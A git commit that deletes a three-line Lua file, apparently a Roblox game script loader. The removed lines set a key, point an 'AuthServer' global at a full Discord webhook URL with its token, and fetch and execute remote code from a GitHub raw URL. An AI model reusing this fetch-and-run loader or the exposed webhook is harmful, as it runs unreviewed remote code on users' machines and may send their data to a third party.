350f41f8e2651751a30b6bbcf4297edad113139c
Extremescripted <120589176+Extremescripted@users.noreply.github.com>
2022-12-17 20:13:58 +0100

    Delete ez.lua

--- ez.lua
+++
@@ -1,3 +0,0 @@
-_G.Key = "9_orBebyaM"
-_G.AuthServer = "https://discord.com/api/webhooks/1052579975112446053/gDI_PWS0aDnLiLNp1uT9ErjtbEo3_OL8aVyknPDZAB49zUps4R-NH399GA0yWxNkBD5L"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
